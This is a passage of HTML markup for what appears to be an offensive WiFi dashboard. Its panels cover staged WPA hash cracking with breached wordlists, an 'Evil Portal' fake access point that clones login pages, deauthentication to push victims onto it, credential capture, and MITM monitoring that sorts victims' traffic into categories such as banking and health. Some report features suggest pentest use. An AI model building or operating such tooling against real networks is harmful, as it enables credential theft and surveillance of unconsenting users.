                <div id="crackedPasswordBox" style="display: none; margin-top: 15px; padding: 15px; background: #002200; border: 2px solid #00ff00; text-align: center;">
                    <div style="color: #00ff00; font-size: 14px;">üîì PASSWORD CRACKED!</div>
                    <div id="crackedPassword" style="color: #00ff00; font-size: 24px; font-weight: bold; margin-top: 10px;">-</div>
                </div>
            </div>
            
            <!-- Right: Controls (40%) -->
            <div class="panel" style="flex: 4; min-width: 0;">
                <h2>üéÆ Controls</h2>
                
                <!-- Stage Buttons -->
                <div style="margin-bottom: 15px;">
                    <div style="color: #888; margin-bottom: 5px; font-size: 12px;">RUN SPECIFIC STAGE:</div>
                    <div style="display: flex; gap: 5px; flex-wrap: wrap;">
                        <button class="button" onclick="runGlassStage(1)" style="flex: 1; min-width: 40px;" title="Stage 1: WiFi Quick Wins - Top 4800 WiFi passwords + router defaults (seconds)">1</button>
                        <button class="button" onclick="runGlassStage(2)" style="flex: 1; min-width: 40px;" title="Stage 2: Common + Rules - 10k common + darkweb 10k with best64 rules (minutes)">2</button>
                        <button class="button" onclick="runGlassStage('3a')" style="flex: 1; min-width: 40px;" title="Stage 3a: Extended + Rules - Xato 100k + Ashley Madison with best64 rules (10-30 min)">3a</button>
                        <button class="button" onclick="runGlassStage('3b')" style="flex: 1; min-width: 40px;" title="Stage 3b: Common + OneRuleToRuleThemAll - 10k words √ó 52k rules (~2 hours)">3b</button>
                        <button class="button" onclick="runGlassStage('4a')" style="flex: 1; min-width: 40px;" title="Stage 4a: RockYou 2024 straight - 146GB wordlist, no rules (~30 hours)">4a</button>
                        <button class="button" onclick="runGlassStage('4b')" style="flex: 1; min-width: 40px;" title="Stage 4b: RockYou 2024 + best64 rules - 146GB √ó 77 rules (~7 days)">4b</button>
                        <button class="button" onclick="runGlassStage(5)" style="flex: 1; min-width: 40px;" title="Stage 5: Deep Dive - all_in_one + dive rules (days+)">5</button>
                    </div>
                </div>
                
                <!-- Main Actions -->
                <div style="display: flex; gap: 10px;">
                    <button class="button" onclick="startGlassQueue()" style="flex: 1; background: #006600; padding: 20px; font-size: 16px;" title="Start cracking the next file in queue">‚ñ∂Ô∏è START</button>
                    <button class="button danger" onclick="stopGlass()" style="flex: 1; padding: 20px; font-size: 16px;" title="Kill hashcat process and stop current cracking attack immediately">‚èπÔ∏è STOP</button>
                </div>
                <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 10px;">
                    <button class="button" onclick="autoEscalateGlass()" style="background: #004400; padding: 10px;" title="Run all stages in sequence (1‚Üí2‚Üí3a‚Üí3b‚Üí4a‚Üí4b‚Üí5) until password found or exhausted">üöÄ Auto-Escalate (All Stages)</button>
                </div>
                
                <!-- Stage Info -->
                <div style="margin-top: 15px; padding: 10px; background: #0a0a0a; border: 1px solid #333; font-size: 11px; color: #666;">
                    <div><strong style="color: #888;">Stage Info:</strong></div>
                    <div>1: WiFi quick wins - top 4800 WiFi + router defaults (seconds)</div>
                    <div>2: Common + best64 rules (minutes)</div>
                    <div>3a: Extended + best64 rules (10-30 min)</div>
                    <div>3b: Common + OneRule (52k rules, ~2 hours)</div>
                    <div>4a: RockYou 2024 straight (~30 hours)</div>
                    <div>4b: RockYou 2024 + best64 (~7 days)</div>
                    <div>5: all_in_one + dive rules (days+)</div>
                </div>
            </div>
        </div>
        
        <!-- File Selection + Queue Row -->
        <div style="display: flex; gap: 20px; margin-bottom: 20px;">
            
            <!-- Local Captures -->
            <div class="panel" style="flex: 1;">
                <h2>üìÅ Local Captures</h2>
                <div style="margin-bottom: 10px;">
                    <input type="file" id="importFile" accept=".pcapng,.cap,.pcap,.hc22000" style="display: none;" onchange="importCapture()">
                    <button class="button" onclick="browseCaptures()" title="Open captures folder in file manager">Browse</button>
                    <button class="button" onclick="loadHashFiles()" title="Reload the list of .hc22000 hash files available for cracking">Refresh</button>
                    <button class="button" onclick="convertSelected()" title="Convert selected .cap/.pcap files to .hc22000 hashcat format">Convert</button>
                    <button class="button danger" onclick="deleteSelected()" title="Permanently delete selected capture files">Delete</button>
                </div>
                <div id="captureList" class="output" style="max-height: 200px; font-size: 11px;">Loading...</div>
                <div style="margin-top: 10px; display: flex; flex-direction: column; gap: 5px;">
                    <button class="button" onclick="sendSelectedToGlass()" style="width: 100%; background: #442200;" title="Upload selected .hc22000 file to Glass inbox for cracking">üì§ Send Selected to Glass</button>
                    <div style="display: flex; gap: 5px;">
                        <button class="button" onclick="crackOnShadowframe()" style="flex: 1; background: #002244;" title="Quick crack locally using top WPA passwords and 8-digit numeric - takes under 5 minutes">üíª Crack on Sh4d0wFr4m3</button>
                        <button class="button danger" onclick="stopLocalCrack()" style="flex: 1;" title="Stop local cracking">Stop</button>
                    </div>
                </div>
            </div>
            
            <!-- Glass Queue -->
            <div class="panel" style="flex: 1;">
                <h2>üì• Glass Queue</h2>
                <div style="display: flex; gap: 5px; margin-bottom: 10px;">
                    <button class="button" onclick="refreshGlassQueue()" title="Reload queue status from Glass">Refresh</button>
                    <button class="button" onclick="pauseGlassCrack()" style="background: #444400;" title="Pause current crack - saves checkpoint for later resume">‚è∏Ô∏è Pause</button>
                    <button class="button" onclick="resumeGlassCrack()" style="background: #004400;" title="Resume paused crack from checkpoint">‚ñ∂Ô∏è Resume</button>
                </div>
                
                <!-- Current Job -->
                <div style="margin-bottom: 8px;">
                    <div style="color: #888; font-size: 10px; margin-bottom: 3px;">CURRENT:</div>
                    <div id="glassCurrentJob" style="padding: 5px; background: #001a00; border: 1px solid #003300; font-size: 11px;">-</div>
                </div>
                
                <!-- Waiting Queue -->
                <div>
                    <div style="color: #888; font-size: 10px; margin-bottom: 3px;">WAITING:</div>
                    <div id="glassQueueList" class="output" style="max-height: 150px; font-size: 11px; padding: 0;">-</div>
                </div>
            </div>
        </div>
        
        <!-- Activity Log -->
        <div class="panel">
            <h2>üìú Activity Log</h2>
            <div id="glassActivityLog" class="output" style="max-height: 150px; font-size: 11px;">Waiting for activity...</div>
        </div>
        
        </div><!-- End page-cracking -->
        
        <!-- Page: Evil Portal -->
        <div id="page-evil-portal" class="page">
            <div style="display: flex; gap: 15px; height: calc(100vh - 80px);">
                
                <!-- Left Column: Configuration -->
                <div style="width: 350px; display: flex; flex-direction: column; gap: 15px;">
                    
                    <!-- Status Indicator -->
                    <div class="panel" style="padding: 10px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <h3 style="margin: 0; color: #0f0;">üëπ Evil Portal</h3>
                            <div id="portalStatusBadge" style="padding: 5px 12px; border-radius: 3px; font-size: 12px; background: #300; border: 1px solid #600; color: #f66;">‚óè STOPPED</div>
                        </div>
                    </div>
                    
                    <!-- SSID Config -->
                    <div class="panel">
                        <label style="color: #0f0; font-size: 12px;">Network Name (SSID):</label>
                        <div style="display: flex; gap: 5px; margin: 5px 0 10px 0;">
                            <input type="text" id="portalSSID" value="Free WiFi" style="flex: 1; padding: 8px; background: #0a0a0a; border: 1px solid #333; color: #0f0;" title="SSID for fake access point - choose something convincing">
                            <button onclick="cloneSSIDFromScan()" style="padding: 8px; background: #1a1a1a; border: 1px solid #333; color: #888; cursor: pointer;" title="Pick SSID from your last scan results">üì°</button>
                        </div>
                        
                        <label style="color: #0f0; font-size: 12px;">Channel:</label>
                        <select id="portalChannel" style="width: 100%; padding: 8px; background: #0a0a0a; border: 1px solid #333; color: #0f0; margin: 5px 0 10px 0;" title="Channel for fake AP - match target or pick a clean one">
                            <option value="1">Channel 1 (2.4GHz)</option>
                            <option value="2">Channel 2 (2.4GHz)</option>
                            <option value="3">Channel 3 (2.4GHz)</option>
                            <option value="4">Channel 4 (2.4GHz)</option>
                            <option value="5">Channel 5 (2.4GHz)</option>
                            <option value="6" selected>Channel 6 (2.4GHz)</option>
                            <option value="7">Channel 7 (2.4GHz)</option>
                            <option value="8">Channel 8 (2.4GHz)</option>
                            <option value="9">Channel 9 (2.4GHz)</option>
                            <option value="10">Channel 10 (2.4GHz)</option>
                            <option value="11">Channel 11 (2.4GHz)</option>
                            <option value="36">Channel 36 (5GHz)</option>
                            <option value="40">Channel 40 (5GHz)</option>
                            <option value="44">Channel 44 (5GHz)</option>
                            <option value="48">Channel 48 (5GHz)</option>
                            <option value="149">Channel 149 (5GHz)</option>
                            <option value="153">Channel 153 (5GHz)</option>
                            <option value="157">Channel 157 (5GHz)</option>
                            <option value="161">Channel 161 (5GHz)</option>
                        </select>
                        
                        <!-- WPA2 Mode -->
                        <div style="margin: 10px 0; padding: 10px; background: #0a0a0a; border: 1px solid #333;">
                            <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;" title="Enable WPA2 mode if you know the target password - devices will auto-connect">
                                <input type="checkbox" id="portalWPA2" onchange="toggleWPA2Password()" style="width: 18px; height: 18px;">
                                <span style="color: #0f0; font-size: 13px;">üîê WPA2 Mode (use cracked password)</span>
                            </label>
                            <div id="wpa2PasswordSection" style="display: none; margin-top: 10px;">
                                <input type="text" id="portalPassword" placeholder="Enter WPA2 password" style="width: 100%; padding: 8px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace;" title="The cracked password for the target network">
                            </div>
                        </div>
                        
                        <label style="color: #0f0; font-size: 12px;">Template:</label>
                        <div style="display: flex; gap: 5px; margin: 5px 0;">
                            <select id="portalTemplate" onchange="previewTemplate()" style="flex: 1; padding: 8px; background: #0a0a0a; border: 1px solid #333; color: #0f0;" title="Portal page design - victims see this when they connect">
                                <option value="">Loading templates...</option>
                            </select>
                            <button onclick="deleteTemplate()" class="button danger" style="padding: 8px 12px; font-size: 11px;" title="Delete selected template">üóëÔ∏è</button>
                        </div>
                        
                        <!-- Website Cloner -->
                        <div style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #333;">
                            <label style="color: #888; font-size: 11px;">üåê Clone Website:</label>
                            <div style="display: flex; gap: 5px; margin-top: 5px;">
                                <input type="text" id="cloneUrl" placeholder="https://login.example.com" style="flex: 1; padding: 8px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace; font-size: 11px;" title="URL of login page to clone">
                                <button onclick="cloneWebsite()" class="button" style="padding: 8px 12px; font-size: 11px;" title="Fetch and create template from URL">üì• Clone</button>
                            </div>
                            <div id="cloneStatus" style="font-size: 10px; color: #666; margin-top: 5px;"></div>
                        </div>
                    </div>
                    
                    <!-- Deauth Companion -->
                    <div class="panel">
                        <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;" title="While portal runs, continuously deauth the real AP to force victims to your fake one">
                            <input type="checkbox" id="portalDeauth" onchange="toggleDeauthMode()" style="width: 18px; height: 18px;">
                            <span style="color: #0f0; font-size: 13px;">‚ö° Deauth Companion Attack</span>
                        </label>
                        <div id="deauthTargetInfo" style="font-size: 11px; color: #666; margin-top: 8px; padding: 8px; background: #0a0a0a; border: 1px solid #222; display: none;">
                            Target: <span id="deauthTargetSSID">None selected</span><br>
                            Use Network Ops to select a target first
                        </div>
                        <div id="deauthModeSection" style="display: none; margin-top: 10px;">
                            <label style="color: #888; font-size: 11px;">Deauth Mode:</label>
                            <select id="deauthMode" onchange="updateDeauthModeDesc()" style="width: 100%; padding: 8px; background: #0a0a0a; border: 1px solid #333; color: #0f0; margin: 5px 0; font-size: 12px;" title="How deauth behaves after capturing credentials">
                                <option value="single" title="Stop deauth after first victim captured - best for targeted assessments">üéØ Single Victim (stop after capture)</option>
                                <option value="multi" title="Keep deauth running - victims may bounce but captures more targets">üé£ Multi Victim (keep deauth running)</option>
                                <option value="smart" title="Only deauth devices not on Twin - best of both worlds">üß† Smart (deauth only non-connected)</option>
                            </select>
                            <div style="font-size: 10px; color: #666; margin-top: 5px;">
                                <div id="deauthModeDesc">üéØ Stop deauth after first capture - victim stays connected</div>
                            </div>
                        </div>
                    </div>
                    
                    <!-- Post-Capture Action -->
                    <div class="panel">
                        <label style="color: #0f0; font-size: 12px;">After Credentials Captured:</label>
                        <select id="postCaptureAction" onchange="toggleRedirectUrl()" style="width: 100%; padding: 8px; background: #0a0a0a; border: 1px solid #333; color: #0f0; margin: 5px 0;" title="What happens after victim enters credentials">
                            <option value="success">‚úì Success Page (You're connected!)</option>
                            <option value="error">‚úó Error Page (Connection failed)</option>
                            <option value="awareness">‚ö† Security Awareness Page</option>
                            <option value="redirect">‚Üó Redirect to URL</option>
                            <option value="passthrough">üåê Passthrough (Internet + MITM Capture)</option>
                        </select>
                        <div id="redirectUrlSection" style="display: none; margin-top: 8px;">
                            <input type="text" id="redirectUrl" placeholder="https://example.com" style="width: 100%; padding: 8px; background: #001a00; border: 1px solid #003300; color: #0f0; font-family: monospace;" title="URL to redirect victims to after capture">
                        </div>

                    </div>
                    
                    <!-- Controls -->
                    <div class="panel">
                        <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                            <button onclick="startPortal()" class="button" style="flex: 1; padding: 12px;" title="Start fake WiFi access point with captive portal">‚ñ∂ Start Portal</button>
                            <button onclick="stopPortal()" class="button danger" style="flex: 1; padding: 12px;" title="Stop evil portal and shut down all services">‚¨õ Stop</button>
                        </div>
                        <button onclick="clearConnections()" class="button" style="width: 100%; padding: 8px; margin-bottom: 5px;" title="Kick all connected clients - forces reconnections">üîÑ Kick All Clients</button>
                    </div>
                    
                    <!-- Output Log -->
                    <div class="panel" style="flex: 1; display: flex; flex-direction: column;">
                        <label style="color: #0f0; font-size: 12px; margin-bottom: 5px;">Status Log:</label>
                        <div class="output" id="portalOutput" style="flex: 1; overflow-y: auto; font-size: 12px;">Ready to deploy portal...</div>
                    </div>
                </div>
                
                <!-- Right Column: Preview + Credentials -->
                <div style="flex: 1; display: flex; flex-direction: column; gap: 15px;">
                    
                    <!-- Template Preview -->
                    <div class="panel" style="flex: 1; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <label style="color: #0f0; font-size: 12px;">Template Preview:</label>
                            <span id="previewTemplateName" style="color: #666; font-size: 11px;">Select a template</span>
                        </div>
                        <iframe id="templatePreview" style="flex: 1; border: 1px solid #333; background: #fff;" title="Preview of selected portal template"></iframe>
                    </div>
                    
                    <!-- Live Credentials -->
                    <div class="panel" style="height: 350px; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <label style="color: #0f0; font-size: 12px;">üîë Captured Credentials: <span id="credentialCount" style="color: #ff0;">(0)</span></label>
                            <div style="display: flex; gap: 5px;">
                                <button onclick="refreshCredentials()" style="padding: 4px 10px; background: #1a1a1a; border: 1px solid #333; color: #888; cursor: pointer; font-size: 11px;" title="Refresh credential log">üîÑ Refresh</button>
                                <button onclick="copyCredentials()" style="padding: 4px 10px; background: #1a1a1a; border: 1px solid #333; color: #888; cursor: pointer; font-size: 11px;" title="Copy all credentials to clipboard">üìã Copy</button>
                                <button onclick="saveCredentials()" style="padding: 4px 10px; background: #1a1a1a; border: 1px solid #333; color: #888; cursor: pointer; font-size: 11px;" title="Download captured credentials as text file">üíæ Save</button>
                                <button onclick="clearCredentialDisplay()" style="padding: 4px 10px; background: #1a1a1a; border: 1px solid #333; color: #888; cursor: pointer; font-size: 11px;" title="Archive current credentials and clear display">üóëÔ∏è Archive</button>
                            </div>
                        </div>
                        <!-- Archive Selector -->
                        <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                            <label style="color: #888; font-size: 11px;">üìÅ View Archive:</label>
                            <select id="archiveSelect" onchange="loadSelectedArchive()" style="flex: 1; padding: 4px; background: #1a1a1a; border: 1px solid #333; color: #0f0; font-size: 11px;" title="Select a past credential capture session to view">
                                <option value="">-- Current Session --</option>
                            </select>
                            <button onclick="deleteSelectedArchive()" style="padding: 4px 10px; background: #1a1a1a; border: 1px solid #333; color: #888; cursor: pointer; font-size: 11px;" title="Delete selected archive file">üóëÔ∏è</button>
                        </div>
                        <div id="credentialLog" style="flex: 1; overflow-y: auto; background: #0a0a0a; border: 1px solid #222; padding: 10px; font-family: monospace; font-size: 12px; color: #0f0;">
                        </div>
                    </div>
                </div>
            </div>
        </div><!-- End page-evil-portal -->
        
        <!-- Page: Wardriving -->
        <div id="page-wardriving" class="page">
        
        <!-- Main Layout: Map + Sidebar -->
        <div style="display: flex; gap: 20px; height: calc(100vh - 120px); min-height: 600px;">
            
            <!-- Left: Map (75%) -->
            <div class="panel" style="flex: 3; display: flex; flex-direction: column; min-width: 0; padding: 10px;">
                <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                    <h2 style="margin: 0;">üó∫Ô∏è Wardrive Map</h2>
                    <div>
                        <button id="liveToggleBtn" class="button" onclick="toggleLiveMode()" style="padding: 5px 15px; background: #003300;" title="Switch between live scanning mode and history map view">üì° Live Mode</button>
                        <button id="historyRefreshBtn" class="button" onclick="refreshWardriveMap()" style="padding: 5px 15px;" title="Reload the wardrive map to show latest data">Refresh Map</button>
                        <button id="placeMarkerBtn" class="button" onclick="toggleMarkerPlacement()" style="padding: 5px 15px; background: #550055;" title="Click to place a custom marker on the map">üìç Place Marker</button>
                        <button class="button" onclick="openMapFullscreen()" style="padding: 5px 15px;" title="Open wardrive map in new browser tab for fullscreen viewing">‚õ∂ Fullscreen</button>
                    </div>
                </div>
                <!-- Custom marker placement form (hidden until marker is placed) -->
                <div id="markerForm" style="display:none; background:#1a1a2e; border:1px solid #00ff00; border-radius:5px; padding:10px; margin-bottom:8px; font-size:12px;">
                    <div style="display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
                        <span style="color:#00ff00;">üìç New Marker</span>
                        <input id="markerLabel" type="text" placeholder="Label (e.g. Front Entrance)" maxlength="100" style="flex:1; min-width:150px; padding:4px 8px; background:#0d0d1a; color:#fff; border:1px solid #444; border-radius:3px; font-size:12px;">
                        <input id="markerColor" type="color" value="#ff0000" style="width:36px; height:28px; border:1px solid #444; border-radius:3px; cursor:pointer;" title="Pick marker color">
                        <button onclick="saveCustomMarker()" class="button" style="padding:4px 12px; background:#27ae60;" title="Save this marker to the map">Save</button>
                        <button onclick="cancelMarkerPlacement()" class="button" style="padding:4px 12px; background:#666;" title="Cancel marker placement">Cancel</button>
                    </div>
                </div>
                <!-- History Mode: Folium map iframe -->
                <iframe id="wardriveMapFrame"
                        src="/wardrive_system/wardrive_master_map.html"
                        style="flex: 1; border: 1px solid #00ff00; background: #000; width: 100%;">
                </iframe>
                <!-- Live Mode: Leaflet map + controls (hidden by default) -->
                <div id="liveWardriveContainer" style="display: none; flex: 1; flex-direction: column; min-height: 0; overflow: hidden;">
                    <div style="display: flex; gap: 10px; margin-bottom: 8px; align-items: center;">
                        <button id="liveStartBtn" class="button" onclick="showScanNamePrompt()" style="padding: 5px 15px; background: #004400;" title="Start live WiFi scanning with GPS tracking">‚ñ∂ Start Scan</button>
                        <button id="liveStopBtn" class="button" onclick="stopLiveWardrive()" style="padding: 5px 15px; background: #440000; display: none;" title="Stop scanning and save session to database">‚¨õ Stop Scan</button>
                        <button id="navModeBtn" class="button" onclick="toggleNavMode()" style="padding: 5px 15px; background: #333;" title="Auto-center map on GPS position and show heading direction">üß≠ Nav</button>
                        <span id="batteryIndicator" style="font-size: 11px; color: #888; padding: 2px 6px; border: 1px solid #333; border-radius: 3px; cursor: default;" title="Laptop battery status">--</span>
                        <div style="flex: 1; display: flex; gap: 15px; font-size: 11px; color: #888; align-items: center;">
                            <span>GPS: <span id="gpsFixStatus" style="color: #ff4444;">No Fix</span> (<span id="gpsSatCount">0</span> sats) <span id="gpsHdop" style="color: #888;" title="Estimated GPS accuracy based on satellite geometry"></span></span>
                            <span>Speed: <span id="gpsSpeed">0</span> mph</span>
                            <span>Hdg: <span id="gpsHeading" style="color: #00aaff;">---</span></span>
                            <span>Networks: <span id="liveNetworkCount" style="color: #00ff00; font-weight: bold;">0</span></span>
                            <span>New: <span id="liveNewCount" style="color: #ff6600; font-weight: bold;">0</span></span>
                            <span>Time: <span id="liveElapsed" style="color: #00aaff;">00:00</span></span>
                        </div>
                    </div>
                    <div style="display: flex; flex: 1; gap: 8px; min-height: 0; overflow: hidden;">
                        <div id="liveMapClip" style="flex: 3; overflow: hidden; position: relative; border: 1px solid #00ff00; background: #111;">
                            <div id="liveMapContainer" style="width: 100%; height: 100%;"></div>
                        </div>
                        <div id="liveNetworkFeed" style="flex: 1; min-width: 220px; max-width: 300px; overflow-y: auto; font-size: 10px; font-family: monospace; background: #0a0a0a; border: 1px solid #333; padding: 5px;">
                            <div style="color: #666;">Start a scan to see live network discoveries...</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Right: Sidebar (25%) -->
            <div style="flex: 1; display: flex; flex-direction: column; gap: 15px; min-width: 250px;">
                
                <!-- Flipper Status -->
                <div class="panel" style="padding: 15px;">
                    <h3 style="margin: 0 0 10px 0; font-size: 14px;">üì° Flipper Status</h3>
                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 6px;">
                        <span id="flipperStatusDot" style="width: 12px; height: 12px; border-radius: 50%; background: #333;"></span>
                        <span id="flipperStatusText" style="color: #888;">Checking...</span>
                    </div>
                    <div id="flipperPortInfo" style="color: #555; font-size: 10px; margin-bottom: 8px; font-family: monospace;"></div>
                    <button id="flipperSyncBtn" class="button" onclick="syncFlipper()" style="width: 100%; padding: 10px; opacity: 0.4; cursor: not-allowed;" disabled title="Pull wardrive data from Flipper Zero and update database/map">üîÑ Sync Now</button>
                    <div id="flipperSyncProgress" style="display: none; margin-top: 6px; padding: 6px; background: #0a0a1a; border: 1px solid #333; font-size: 10px; font-family: monospace; color: #888; max-height: 60px; overflow-y: auto;"></div>
                    <div id="lastSyncTime" style="color: #666; font-size: 11px; margin-top: 5px; text-align: center;">Last sync: Never</div>
                </div>
                
                <!-- Database Stats -->
                <div class="panel" style="padding: 15px;">
                    <h3 style="margin: 0 0 10px 0; font-size: 14px;">üìä Database Stats</h3>
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 8px; font-size: 12px;">
                        <div style="background: #001100; padding: 8px; text-align: center;">
                            <div style="color: #888;">Total</div>
                            <div id="statTotal" style="color: #00ff00; font-size: 18px; font-weight: bold;">-</div>
                        </div>
                        <div style="background: #110000; padding: 8px; text-align: center;">
                            <div style="color: #888;">Open</div>
                            <div id="statOpen" style="color: #ff6600; font-size: 18px; font-weight: bold;">-</div>
                        </div>
                        <div style="background: #001100; padding: 8px; text-align: center;">
                            <div style="color: #888;">Secured</div>
                            <div id="statSecured" style="color: #00ff00; font-size: 18px; font-weight: bold;">-</div>
                        </div>
                        <div style="background: #000d11; padding: 8px; text-align: center;">
                            <div style="color: #888;">Sessions</div>
                            <div id="statSessions" style="color: #00aaff; font-size: 18px; font-weight: bold;">-</div>
                        </div>
                    </div>
                    <button class="button" onclick="refreshWardriveStats()" style="width: 100%; margin-top: 10px; padding: 5px;" title="Reload network counts from wardrive database">Refresh Stats</button>
                </div>
                
                <!-- Recent Sessions -->
                <div class="panel" style="padding: 15px; flex: 1; display: flex; flex-direction: column; min-height: 150px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                        <h3 style="margin: 0; font-size: 14px;">üìã Recent Sessions</h3>
                        <button class="button" onclick="showAllNetworks()" style="padding: 3px 8px; font-size: 11px;" title="Reset map to show all networks from all sessions">Show All</button>
                    </div>
                    <div id="sessionList" style="flex: 1; overflow-y: auto; font-size: 12px;">
                        <div style="color: #666;">Loading sessions...</div>
                    </div>
                </div>

                <!-- Client Report -->
                <div class="panel" style="padding: 15px;">
                    <h3 style="margin: 0 0 10px 0; font-size: 14px;">üìÑ Client Report</h3>
                    <button class="button" onclick="showReportModal()" style="width: 100%; padding: 10px;" title="Generate professional PDF report of wardrive findings">üìä Generate Report</button>
                    <div id="reportStats" style="color: #666; font-size: 11px; margin-top: 8px; text-align: center;">
                        <span id="reportCriticalCount" style="color: #ff4444;">-</span> critical ¬∑
                        <span id="reportHighCount" style="color: #ff8800;">-</span> high risk
                    </div>
                </div>

            </div>
        </div>

        <!-- Sync Log -->
        <div class="panel" style="margin-top: 15px;">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                <h3 style="margin: 0; font-size: 14px;">üìú Sync Log</h3>
                <span onclick="document.getElementById('wardriveSyncLog').innerHTML=''" style="color: #666; font-size: 11px; cursor: pointer;" title="Clear the sync log">Clear</span>
            </div>
            <div id="wardriveSyncLog" class="output" style="max-height: 200px; font-size: 11px;">Ready to sync...</div>
        </div>
        
        </div><!-- End page-wardriving -->
        
        <!-- Page: MITM -->
        <div id="page-mitm" class="page">
            <div style="display: flex; gap: 15px; height: calc(100vh - 140px);">
                
                <!-- Left Column: Activity Feed -->
                <div style="flex: 2; display: flex; flex-direction: column; gap: 15px;">
                    
                    <!-- Services Detected -->
                    <div class="panel">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <h3 style="margin: 0; color: #0f0;">üéØ Services Detected</h3>
                            <span id="serviceCount" style="color: #666; font-size: 12px;">(0 services)</span>
                        </div>
                        <div id="servicesGrid" style="display: flex; flex-wrap: wrap; gap: 8px; min-height: 40px;">
                            <div style="color: #666; font-size: 12px;">Waiting for victim activity...</div>
                        </div>
                    </div>
                    
                    <!-- Activity Feed -->
                    <div class="panel" style="flex: 1; display: flex; flex-direction: column;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <h3 style="margin: 0; color: #0f0;">üì° Live Activity</h3>
                            <div style="display: flex; gap: 5px; align-items: center;">
                                <span id="activityCount" style="color: #666; font-size: 12px;">(0 activities)</span>
                                <button onclick="refreshMitm()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Refresh activity">üîÑ</button>
                                <button onclick="exportMitm()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Export intelligence report">üì• Export</button>
                                <button onclick="clearDnsLog()" class="button danger" style="padding: 5px 10px; font-size: 11px;" title="Clear all logs">üóëÔ∏è</button>
                            </div>
                        </div>
                        <div id="activityFeed" style="flex: 1; overflow-y: auto; background: #0a0a0a; border: 1px solid #222; padding: 10px;">
                            <div style="color: #666; font-size: 13px;">Start Evil Portal with Passthrough mode to monitor victim activity...</div>
                        </div>
                    </div>
                </div>
                
                <!-- Right Column: Status + Intelligence -->
                <div style="flex: 1; display: flex; flex-direction: column; gap: 15px;">
                    
                    <!-- MITM Status -->
                    <div class="panel">
                        <h3 style="margin: 0 0 10px 0; color: #0f0;">üìä MITM Status</h3>
                        <div style="font-size: 13px;">
                            <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #222;">
                                <span>Portal Active:</span>
                                <span id="mitmPortalStatus" style="color: #ff4444;">Not Running</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #222;">
                                <span>Mode:</span>
                                <span id="mitmMode" style="color: #666;">-</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #222;">
                                <span>Connected Clients:</span>
                                <span id="mitmClientCount" style="color: #0f0;">0</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; padding: 8px 0; border-bottom: 1px solid #222;">
                                <span>Raw DNS Queries:</span>
                                <span id="mitmRawCount" style="color: #666;">0</span>
                            </div>
                            <div style="display: flex; justify-content: space-between; padding: 8px 0;">
                                <span>Credentials Captured:</span>
                                <span id="mitmCredCount" style="color: #ff9900;">0</span>
                            </div>
                        </div>
                        <button onclick="newMitmSession()" class="button" style="width: 100%; padding: 8px; margin-top: 10px; font-size: 12px;" title="Clear all captured data and start fresh session (keeps portal running)">üîÑ New Session</button>
                    </div>
                    
                    <!-- Intelligence Summary -->
                    <div class="panel" style="flex: 1;">
                        <h3 style="margin: 0 0 10px 0; color: #0f0;">üß† Intelligence</h3>
                        <div id="intelligenceSummary" style="font-size: 12px; overflow-y: auto;">
                            <div style="color: #666;">Analyze victim behavior patterns...</div>
                        </div>
                    </div>
                    
                    <!-- Legend -->
                    <div class="panel">
                        <h3 style="margin: 0 0 10px 0; color: #666; font-size: 12px;">Categories</h3>
                        <div style="font-size: 10px; color: #888; display: grid; grid-template-columns: 1fr 1fr; gap: 3px;">
                            <span>üè¶ Banking</span><span>üí≥ Payments</span>
                            <span>‚Çø Crypto</span><span>üíä Health</span>
                            <span>üèõÔ∏è Government</span><span>üîê VPN</span>
                            <span>üìß Email</span><span>üíº Work</span>
                            <span>üõí Shopping</span><span>üçî Food</span>
                            <span>‚úàÔ∏è Travel</span><span>üì± Social</span>
                            <span>üé¨ Streaming</span><span>üéÆ Gaming</span>
                            <span>‚ù§Ô∏è Dating</span><span>üîû Adult</span>
                        </div>
                    </div>
                    
                </div>
            </div>
        </div><!-- End page-mitm -->
        
        <!-- Page: Internal Network Attack -->
        <div id="page-internal" class="page">
            <div style="display: flex; flex-direction: column; height: 100%; gap: 15px; padding: 15px;">
                
                <!-- Top Row: Discovery + Responder -->
                <div style="display: flex; gap: 15px; flex: 0 0 auto;">
                    
                    <!-- Passive Discovery -->
                    <div class="panel" style="flex: 2; padding: 15px;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
                            <h3 style="margin: 0; color: #0f0;">üîç Passive Discovery</h3>
                            <div style="display: flex; gap: 5px; align-items: center;">
                                <span id="discoverStatus" style="color: #666; font-size: 12px;">Stopped</span>
                                <select id="discoverInterface" style="padding: 5px; background: #0a0a0a; border: 1px solid #333; color: #0f0; font-size: 11px;" title="Network interface to monitor">
                                    <option value="alfa0">alfa0</option>
                                    <option value="alfa1">alfa1</option>
                                    <option value="eth0">eth0</option>
                                    <option value="wlan0">wlan0</option>
                                </select>
                                <button onclick="startDiscovery()" class="button" style="padding: 5px 10px; font-size: 11px;" title="Start passive network monitoring">‚ñ∂Ô∏è Start</button>
